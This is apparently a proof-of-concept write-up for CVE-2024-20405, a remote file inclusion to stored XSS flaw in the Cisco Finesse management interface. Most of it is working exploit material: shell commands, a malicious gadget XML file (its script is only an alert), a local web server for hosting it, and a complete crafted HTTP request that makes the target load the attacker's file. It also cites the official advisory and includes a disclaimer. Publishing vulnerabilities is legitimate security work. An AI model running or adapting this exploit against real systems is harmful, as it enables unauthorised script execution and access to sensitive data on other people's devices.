
## Description

A vulnerability in the web-based management interface of Cisco Finesse could allow an unauthenticated, remote attacker to conduct a stored XSS attack by exploiting an RFI vulnerability. This vulnerability is due to insufficient validation of user-supplied input for specific HTTP requests that are sent to an affected device. An attacker could exploit this vulnerability by persuading a user to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script code in the context of the affected interface or access sensitive information on the affected device.



## Proof of Concept (PoC)

1. Create a full path that matches the same path for the original scheme.

```Bash
mkdir cuicui && mkdir cuicui/gadget && mkdir cuicui/gadget/LiveData
```

![](screenshots/Pasted%20image%2020240609200833.png)

2. Create a configuration file "LiveDataGadget.xml" containing malicious code to be run when the file is called.

```Bash
nano cuicui/gadget/LiveData/LiveDataGadget.xml
```

```XML
<?xml version="1.0" encoding="UTF-8" ?>

<Module>

<ModulePrefs title="__MSG_default_gadget_title__" height="0" >
    <Require feature="pubsub-2" />
    <Require feature="settitle" />
    <Require feature="setprefs" />
    <Require feature="dynamic-height" />
    <Require feature="views" />
    <Optional feature="content-rewrite">
        <!-- these files will be directly served by cuic, not through shindig -->
        <Param name="exclude-url">cuicui/gadget/report-gadget.min.js</Param>
        <Param name="exclude-url">cuicui/gadget/report-gadget.min.css</Param>
        <Param name="exclude-url">desktop/assets/js/finesse.min.js</Param>
        <Param name="exclude-url">desktop/scripts/js/ccbu-third-party.min.js</Param>
      <Param name="exclude-url">desktop/scripts/fonts/Cisco_Toolkit_Icons.woff</Param>
      <Param name="exclude-url">desktop/scripts/fonts/CiscoSansTTRegular.woff</Param>
      <Param name="exclude-url">desktop/scripts/fonts/Cisco_Toolkit_Icons.woff2</Param>
      <Param name="exclude-url">desktop/scripts/fonts/Cisco_Toolkit_Icons.eot</Param>
    </Optional>
   
</ModulePrefs>

    <UserPref name="scheme" display_name="scheme" default_value=""/>
    <UserPref name="host" display_name="host" default_value=""/>
    <UserPref name="hostPort" display_name="hostPort" default_value=""/>

  <Content type="html" view="default,canvas">
   
    <![CDATA[
    <!DOCTYPE html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta charset="UTF-8" />
        <script type="text/javascript">
            alert("From RFI To XSS")
        </script>
    </head>

    <body class="claro" >
    <h1>Cisco Finesse v12.6</h1>
    </body>
    ]]>
  </Content>
</Module>
```

![](screenshots/Pasted%20image%2020240609200935.png)

3. Run a local web server to host the malicious configuration file "LiveDataGadget.xml".

```Bash
python3 -m http.server <port>
```

![](screenshots/Pasted%20image%2020240609201329.png)

4. Send the below request to include the malicious configuration file from your local web server, after replacing the `<target>`, `<IP>` and `<port>` of yours.

```HTTP
GET /gadgets/ifr?container=default&mid=0&nocache=0&country=US&lang=en&view=default&refresh=86400&up_id=6000&up_order=14&up_urlPrefs=%7B%22gadgetHeight%22%3A%22280%22%2C%22viewId%22%3A%2256BC5CCE8C37467EA4D4EFA8371258BC%22%2C%22filterId%22%3A%22agentStateLog.id%3DCL%20teamName%22%2C%22scheme%22%3A%22https%22%2C%22hostname%22%3A%22cuica.<target>%22%2C%22port%22%3A%228444%22%7D&up_country=US&up_language=en&up_locale=en_US&up_host=<target>&up_hostPort=8445&up_extension=<extension>&up_xmppDomain=<target>&up_pubsubDomain=pubsub.<target>&up_restHost=<target>&up_mobileAgentMode=undefined&up_mobileAgentDialNumber=undefined&up_scheme=https&up_localhostFQDN=<target>&up_localhostPort=8082&up_teamId=1&up_teamName=Default&up_systemAuthMode=NON_SSO&up_compatibilityMode=false&up_toasterNotificationTimeout=8&up_navItemRoute=%23%2FmyHistory&up_speechRecognitionHighlights=problem%2C%20solution%2C%20defect%2C%20issue%2C%20summary%2C%20glitch%2C%20resolved%2C%20resolution&up_cceSkillTargetId=5515&up_enableDropParticipantFor=supervisor_only&up_dropParticipant=agents&up_CCDContainer=true&up_externalServerHost=https%3A%2F%2F<target>%3A8445&up_deploymentType=UCCE&up_peripheralId=5000&up_messages=%7B%22select.agent.message%22%3A%22Select%20an%20Agent%20from%20Team%20Performance%20Gadget%22%7D&up_gadgetInfo=undefined&st=john.doe:john.doe:appid:cont:url:0:default&url=http%3A%2F%2F<IP>%3A<port>%2Fcuicui%2Fgadget%2FLiveData%2FLiveDataGadget.xml%3FgadgetHeight%3D280%26viewId%3D56BC5CCE8C37467EA4D4EFA8371258BC%26filterId%3DagentStateLog.id%3DCL%2520teamName HTTP/2
Host: <target>:8445
Cookie: timeBeforeFailover=1695819521188; timeBeforeAttemptingLoginInIframe=1695819523191; attemptsMade=1; seqNumberGenerated=1; finesse_ag_extension=<extension>; activeDeviceId4000=SEPD4AD717A03F6; timeBeforeLoadingOtherSide=1695810942373
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://<target>:8445/desktop/container/?locale=en_US&fromlogout=true
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Te: trailers
```

![](screenshots/Pasted%20image%2020240609202700.png)

5. After sending the request, you will get an HTTP request from the web server to include the remote malicious configuration file.

![](screenshots/Pasted%20image%2020240609202813.png)

6. The malicious code was run after including the configuration file. 

![](screenshots/Pasted%20image%2020240609203152.png)



## References

- [https://nvd.nist.gov/vuln/detail/CVE-2024-20405](https://nvd.nist.gov/vuln/detail/CVE-2024-20405)
- [https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-finesse-ssrf-rfi-Um7wT8Ew](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-finesse-ssrf-rfi-Um7wT8Ew)



## Disclaimer

This is just a Proof of Concept (PoC) to demonstrate that the Cisco Finesse web-based management interface is vulnerable to Remote File Inclusion (RFI), and this PoC is for educational purposes only. Use it responsibly and only on systems with explicit permission to test. Misuse of this PoC can result in severe consequences.